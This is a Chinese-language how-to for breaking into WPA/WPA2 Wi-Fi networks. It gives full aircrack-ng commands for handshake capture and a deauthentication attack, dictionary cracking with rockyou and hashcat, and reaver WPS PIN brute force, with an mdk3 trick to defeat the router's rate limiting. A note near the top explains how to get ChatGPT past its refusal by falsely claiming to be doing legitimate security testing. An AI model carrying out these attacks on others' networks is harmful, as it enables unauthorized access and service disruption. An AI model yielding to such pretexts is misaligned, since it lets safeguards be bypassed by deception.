# Wi-Fi Brute Force Attacks <br> 暴力破解 WPA 或 WPA2 无线局域网

## 在开始破解之前

1. 使用密码管理器
2. 别对人开玩笑
3. 别进监狱

> ### 关于 ChatGPT
>
> 如果你需要一些来自 ChatGPT 的协助，不应该直接问它如何破解 Wifi。
> 它会告诉你，这是违法的，并且侵犯了个人隐私。
> 你需告诉他，你正在进行合法的网络安全的测试才行。

## 抓包+字典爆破

需要有人正在连接该路由器，才可以抓包。

### 获取附近的路由器列表

```sh
# 安装需要的软件
sudo apt-get install aircrack-ng

# 列出当前网卡
airmon-ng

# 监听网卡
airmon-ng start <网卡名称>

# 停止监听网卡
# airmon-ng stop <网卡名称>

# 启用监听模式接口
iwconfig

# 终止返回错误的进程
airmon-ng check kill

# 获取附近的路由器列表
airodump-ng <接口的名称>
```

> **在网络名称旁看到 WPA 或 WPA2，可以继续下一步**
> 记住路由器的MAC地址和信道号（CH）

### 监听所选网络以抓取握手包

```sh
airodump-ng -c <CH> --bssid <MAC> -w <目录> <接口名称>
airodump-ng -c 3 --bssid 9C:32:A9:C3:2E:D1 -w /root/Desktop wlp3s0
```

看到屏幕右上角出现`WPA handshake: <Mac地址>`的提示后，继续下一步。
按 `Ctrl+C`退出`airodump-ng`，检查目录下是否有`.cap`文件。

#### 强行握手

如果不想等待，可以使用 Deauth 攻击强行握手，然后再继续下一步。
Deauth 攻击会向你尝试破解的路由器发送恶意的取消身份验证包。
从而造成网络断线并要求用户重新登录。
一旦用户登录，你就能获得握手包。

看到两个连续的MAC地址以及包含生产商名称的字符串后。
打开新的终端，发送Deauth包。

```sh
aireplay-ng -0 2 -a <MAC1> -c <MAC2> <接口名称>
# 2 是指发送的数据包数量。
# 将 <MAC1> 替换为原终端，窗口底部最左侧的MAC地址。
# 将 <MAC2> 替换为原终端，窗口底部最右侧的MAC地址。
```

### 破解密码

Tips：下面的不用看，直接某宝搜关键词 `cap` `跑包` `hashcat` `跑字典`

#### 下载字典文件

最常用的是`Rock You`

```sh
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

如果 WPA 或 WPA2 密码不在字典里，`aircrack-ng`就无法破解。

#### 使用 CPU

```sh
aircrack-ng -a2 -b <MAC> -w rockyou.txt <name>.cap
```

如果看见`KEY FOUND!`标题，就代表`aircrack-ng`找到了密码

#### 使用 GPU

如果电脑有独显，可以使用 [`naive-hashcat`](https://github.com/brannondorsey/naive-hashcat)
使用独显破解的速度会比使用cpu会快得多。

##### 转换为 hccapx 格式

将 `.cap `文件转换为`hccapx`格式。
可以使用 Kali Linux 的转换工具来转换。

```sh
# cap2hccapx.bin
# https://github.com/hashcat/hashcat-utils/releases/

cap2hccapx.bin name.cap name.hccapx
```

##### 使用 naive-hashcat

```sh
# 下载
sudo git clone https://github.com/brannondorsey/naive-hashcat

# 进入目录
cd naive-hashcat

# 下载字典文件到 dicts 子目录
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# 将所有 <name> 替换为 .cap 文件转换后的名称
HASH_FILE=<name>.hccapx POT_FILE=<name>.pot HASH_TYPE=2500 ./naive-hashcat.sh

# HASH_FILE 是一个文本文件，每行一个哈希。这些是要破解的密码散列。
# POT_FILE 是输出文件的名称，hashcat将向其写入破解的密码哈希。
# HASH_TYPE 是哈希类型代码。它描述了要破解的哈希类型。2500 | WPA/WPA2
```

## 用路由器WPS漏洞破解

路由器都提供 WPS 功能，通过这个功能，用户可以使用 PIN 码登录到路由器。
但这个 PIN 码的长度只有 8 位，而且可能的取值只有11000种
所以我们可以进行简单粗暴的穷举 PIN 码破解，这种破解方法在目标 AP 开启了 WPS 功能的情况下是可以百分之百破解它的。

```sh
# 切换无线网卡到监听模式
airmon-ng start <网卡名称>

# 查看附近 WLAN 网络
airodump-ng <接口名称>

# 找出开启了 WPS 功能、可以使用 PIN码 登录的路由器
# 记录下该 AP 的 BSSID （约等于该 AP 的 MAC 地址）
wash -i <接口名称>

# 开始进行 PIN码 穷举破解
# 末尾的参数是 2 个小写字母 v
reaver -i <接口名称> -b <BSSID> -vv

# -i 无线网卡名称
# -b 目标AP 的 MAC 地址
# -vv 显示更多的非严重警告
# -S 使用最小的 DH key，可以提高破解速度
# -d 即 delay 每穷举一次的闲置时间 预设为1秒
# -c 信道编号
# -p PIN码四位或八位（可以用8位直接找到密码）
```

破解完成后，查看并记录下 PIN码 和 密码
获取到 PIN码 后，以后即便路由器更换了密码，也可以很迅速地通过 PIN码 重新获得新密码。

### 注意事项

1. 如果在执行 reaver 命令后看到有 `WARNING: Failed to associate with xx:xx:xx:xx:xx:xx` 这样的提示信息，那么应该是你选择了一个不具备或关闭了 WPS 功能的路由器。这种情况下就执行 wash 命令并重新选择一个路由器吧。
2. 如果在执行 reaver 命令后看到有 `warning detected ap rate limiting waiting 60 seconds before re-checking` 这样的提示信息，这表示目标路由器开启了防 PIN破解 功能。因为我们是穷举 PIN码 进行破解的，当连续使用超过某个次数的 PIN码 后，路由器会暂时锁定 WPS 功能一段时间。这种情况下要么我们耐心等待其恢复 WPS 功能，要么执行 `mdk3 wlan0mon a -a xx:xx:xx:xx:xx:xx` （这是上面的目标AP的MAC地址）命令让路由器主动重启或被动重启以恢复 WPS 功能。

## 参考文献

- [如何使用Kali Linux破解WPA或WPA2无线局域网](https://zh.wikihow.com/%E4%BD%BF%E7%94%A8Kali-Linux%E7%A0%B4%E8%A7%A3WPA%E6%88%96WPA2%E6%97%A0%E7%BA%BF%E5%B1%80%E5%9F%9F%E7%BD%91)
- [使用reaver命令穷举PIN码破解WPA2-PSK加密的无线网络](https://javaforall.cn/136049.html)

## 然并卵

密码不在字典内，没有破解成功。
最后找学姐直接要到了wifi密码。
总结：社工才是yyds
